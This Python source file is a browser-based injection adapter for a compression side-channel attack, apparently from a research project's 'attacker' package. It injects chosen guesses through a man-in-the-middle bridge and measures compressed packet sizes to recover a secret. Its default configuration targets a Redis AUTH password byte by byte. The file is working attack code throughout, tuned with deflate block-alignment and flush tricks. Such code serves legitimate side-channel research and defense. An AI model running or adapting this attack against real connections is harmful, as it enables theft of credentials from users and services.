"""Browser-based plaintext injection adapter (Section 5.2).

sendBeacon() fuses CHANNEL_OPEN and CHANNEL_DATA into a single injection,
so there is no pre-opened measure channel; the measurement filter
(`measurement_min_segment_size`, default 100 here) excludes the small
CHANNEL_OPEN packet.

BrowserBridge (shared WebSocket state) is owned by mitm.py and injected
into the adapter; the adapter only sees an `inject(bytes)` coroutine.
"""

from __future__ import annotations

import asyncio
import random
import secrets
from typing import TYPE_CHECKING

from attacker.attack.config import AttackConfig, AlignmentMode
from attacker.attack.adapters.direct import CLIENT_BASE, _sum_c2s

if TYPE_CHECKING:
    import aiohttp

    from attacker.attack.adapters.browser_bridge import BrowserBridge
    from attacker.mitm import PacketLog


class BrowserAdapter:
    def __init__(self, packet_log: PacketLog, bridge: BrowserBridge) -> None:
        self._packet_log = packet_log
        self._bridge = bridge
        self._config: AttackConfig | None = None
        self._session: aiohttp.ClientSession | None = None

    async def setup(self, config: AttackConfig, http_session: aiohttp.ClientSession) -> None:
        self._config = config
        self._session = http_session

    async def teardown(self) -> None:
        self._config = None
        self._session = None

    async def measure_once(
        self, prefix: bytes, candidate: bytes, alignment: bytes,
    ) -> int:
        cfg = self._config
        assert cfg is not None and self._session is not None

        # A fresh random flush per measurement -- a cached flush would create
        # a persistent LZ77 bias that averaging across rounds cannot remove.
        if cfg.flush_bytes > 0:
            await self._bridge.inject(_make_flush(cfg, cfg.flush_bytes))
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)

        async with self._session.post(f"{CLIENT_BASE}/send_secret") as r:
            await r.read()
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)

        # Optional per-measurement filler prepended to the guess body so the
        # deflate auto-flush at lit_bufsize (16384 symbols) closes block 1 on
        # headers + filler-head, leaving the guess in a small block 2 that
        # zlib can encode independently with fixed Huffman.
        body = prefix + candidate + alignment
        if cfg.guess_prefill_bytes > 0:
            body = _make_flush(cfg, cfg.guess_prefill_bytes) + body
        self._packet_log.clear()
        await self._bridge.inject(body)
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)
        return _sum_c2s(
            self._packet_log.snapshot(), cfg.measurement_min_segment_size,
        )

    @classmethod
    def default_config(cls) -> AttackConfig:
        return AttackConfig(
            known_prefix=b"*3\r\n$4\r\nAUTH\r\n$7\r\ndefault\r\n$",
            alphabet=[bytes([c]) for c in b"abcdefghijklmnopqrstuvwxyz0123456789"],
            max_length=32,
            terminator=b"\r",
            commit_margin=64,
            max_rounds=128,
            settle=0.05,
            alignment_mode=AlignmentMode.FULL_SWEEP,
            # [0..7] is sufficient because guess_prefill_bytes (below) forces
            # the guess into a small post-lit_bufsize block that zlib encodes
            # with fixed Huffman -- 8-bit literals, mod-8 alignment residue
            # restored. Without the prefill the guess packet's HTTP headers
            # skew the block into dynamic Huffman and alignment bytes cost
            # 9-12 bits; [0..7] would then miss residue 1 mod 8 for a 1/8
            # per-position failure rate.
            alignment_lengths=list(range(8)),
            candidate_elimination=True,
            constant_prefix_trim=True,
            adaptive_alignment_sweep=False,
            alignment_reintroduction=False,
            alignment_carryover=False,
            outlier_threshold=32,
            flush_bytes=32768,
            flush_pool="secrets_random",
            measurement_min_segment_size=100,
            candidate_fork_on_stall=False,
            fork_top_k=5,
            max_fork_depth=2,
            guess_prefill_bytes=16384,
            label="browser-default",
        )


def _make_flush(cfg: AttackConfig, size: int) -> bytes:
    if cfg.flush_pool == "high_ascii":
        return bytes(random.choices(range(0x80, 0x100), k=size))
    return secrets.token_bytes(size)
